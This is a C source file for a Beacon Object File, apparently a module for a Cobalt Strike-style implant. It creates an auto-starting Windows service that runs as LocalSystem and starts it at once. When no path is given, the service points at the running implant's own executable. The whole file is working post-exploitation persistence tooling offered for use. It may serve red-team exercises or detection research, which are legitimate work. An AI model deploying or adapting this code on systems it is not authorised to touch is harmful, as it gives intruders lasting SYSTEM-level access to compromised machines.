/*
 * svc_create_api.c — Create a Windows service via SCM API.
 *
 * Uses OpenSCManagerA / CreateServiceA directly (no sc.exe).
 *
 * Args: "<service_name>" or "<service_name> <exe_path>"
 *   If exe_path is omitted, defaults to the current process executable path.
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -c svc_create_api.c -o svc_create_api.o
 */

#include <windows.h>
#include "beacon.h"

/* ---- BOF API Imports ---- */
DECLSPEC_IMPORT DWORD    WINAPI KERNEL32$GetModuleFileNameA(HMODULE, LPSTR, DWORD);
DECLSPEC_IMPORT DWORD    WINAPI KERNEL32$GetLastError(void);

DECLSPEC_IMPORT SC_HANDLE WINAPI ADVAPI32$OpenSCManagerA(LPCSTR, LPCSTR, DWORD);
DECLSPEC_IMPORT SC_HANDLE WINAPI ADVAPI32$CreateServiceA(SC_HANDLE, LPCSTR, LPCSTR,
    DWORD, DWORD, DWORD, DWORD, LPCSTR, LPCSTR, LPDWORD, LPCSTR, LPCSTR, LPCSTR);
DECLSPEC_IMPORT BOOL      WINAPI ADVAPI32$StartServiceA(SC_HANDLE, DWORD, LPCSTR*);
DECLSPEC_IMPORT BOOL      WINAPI ADVAPI32$CloseServiceHandle(SC_HANDLE);

/* ---- No-CRT helpers ---- */
static void bof_memset(void* dst, int val, unsigned long long n) {
    unsigned char* p = (unsigned char*)dst;
    while (n--) *p++ = (unsigned char)val;
}
static void bof_memcpy(void* d, const void* s, unsigned long long n) {
    unsigned char* pd = (unsigned char*)d;
    const unsigned char* ps = (const unsigned char*)s;
    while (n--) *pd++ = *ps++;
}
static int bof_strlen(const char* s) { int n = 0; while (s[n]) n++; return n; }
static int sa(char* dst, int pos, const char* src) {
    int len = bof_strlen(src);
    bof_memcpy(dst + pos, src, len);
    return pos + len;
}
static int uitoa(char* buf, unsigned long v) {
    if (v == 0) { buf[0] = '0'; return 1; }
    char tmp[12]; int ti = 0;
    while (v) { tmp[ti++] = '0' + (v % 10); v /= 10; }
    for (int i = 0; i < ti; i++) buf[i] = tmp[ti - 1 - i];
    return ti;
}

void go(char* args, int alen)
{
    char* input = NULL;
    int input_len = 0;

    if (args && alen >= 2) {
        datap parser;
        BeaconDataParse(&parser, args, alen);
        input = BeaconDataExtract(&parser, &input_len);
    }
    if (!input || input_len <= 0) {
        BeaconOutput(CALLBACK_ERROR,
            "Usage: <service_name> [exe_path]\n", 33);
        return;
    }

    /* Split args: service_name [exe_path] */
    char raw[512];
    bof_memset(raw, 0, sizeof(raw));
    int clen = input_len < 511 ? input_len : 511;
    bof_memcpy(raw, input, clen);
    raw[clen] = '\0';

    char* svc_name = raw;
    char* exe_path = NULL;

    for (int i = 0; i < clen; i++) {
        if (raw[i] == ' ') {
            raw[i] = '\0';
            exe_path = raw + i + 1;
            break;
        }
    }

    /* Default to current exe if no path given */
    char self_path[512];
    if (!exe_path || bof_strlen(exe_path) == 0) {
        DWORD plen = KERNEL32$GetModuleFileNameA(NULL, self_path, sizeof(self_path));
        if (plen == 0 || plen >= sizeof(self_path)) {
            BeaconOutput(CALLBACK_ERROR, "[SvcAPI] GetModuleFileName failed\n", 34);
            return;
        }
        self_path[plen] = '\0';
        exe_path = self_path;
    }

    /* Open SCM */
    SC_HANDLE hScm = ADVAPI32$OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hScm) {
        char err[128]; int ep = 0;
        ep = sa(err, ep, "[SvcAPI] OpenSCManager failed (err ");
        ep += uitoa(err + ep, KERNEL32$GetLastError());
        ep = sa(err, ep, "). Need admin privileges.\n");
        BeaconOutput(CALLBACK_ERROR, err, ep);
        return;
    }

    /* Create service: OWN_PROCESS, AUTO_START, ERROR_IGNORE */
    SC_HANDLE hSvc = ADVAPI32$CreateServiceA(
        hScm,
        svc_name,                     /* lpServiceName     */
        svc_name,                     /* lpDisplayName     */
        SERVICE_ALL_ACCESS,           /* dwDesiredAccess   */
        SERVICE_WIN32_OWN_PROCESS,    /* dwServiceType     */
        SERVICE_AUTO_START,           /* dwStartType       */
        SERVICE_ERROR_IGNORE,         /* dwErrorControl    */
        exe_path,                     /* lpBinaryPathName  */
        NULL,                         /* lpLoadOrderGroup  */
        NULL,                         /* lpdwTagId         */
        NULL,                         /* lpDependencies    */
        NULL,                         /* lpServiceStartName (LocalSystem) */
        NULL                          /* lpPassword        */
    );

    if (!hSvc) {
        DWORD err = KERNEL32$GetLastError();
        char msg[256]; int mp = 0;
        mp = sa(msg, mp, "[SvcAPI] CreateService failed (err ");
        mp += uitoa(msg + mp, err);
        if (err == 1073) {
            mp = sa(msg, mp, " - service already exists");
        } else if (err == 5) {
            mp = sa(msg, mp, " - access denied");
        }
        msg[mp++] = ')'; msg[mp++] = '\n';
        BeaconOutput(CALLBACK_ERROR, msg, mp);
        ADVAPI32$CloseServiceHandle(hScm);
        return;
    }

    /* Try to start the service immediately */
    BOOL started = ADVAPI32$StartServiceA(hSvc, 0, NULL);

    char out[768]; int op = 0;
    op = sa(out, op, "[SvcAPI] Service created successfully\n");
    op = sa(out, op, "  Name    : "); op = sa(out, op, svc_name); out[op++] = '\n';
    op = sa(out, op, "  Path    : "); op = sa(out, op, exe_path); out[op++] = '\n';
    op = sa(out, op, "  Start   : auto\n");
    op = sa(out, op, "  Account : LocalSystem\n");
    op = sa(out, op, "  Method  : SCM API (CreateServiceA)\n");
    if (started) {
        op = sa(out, op, "  Status  : started\n");
    } else {
        op = sa(out, op, "  Status  : created (start pending)\n");
    }
    BeaconOutput(CALLBACK_OUTPUT, out, op);

    ADVAPI32$CloseServiceHandle(hSvc);
    ADVAPI32$CloseServiceHandle(hScm);
}
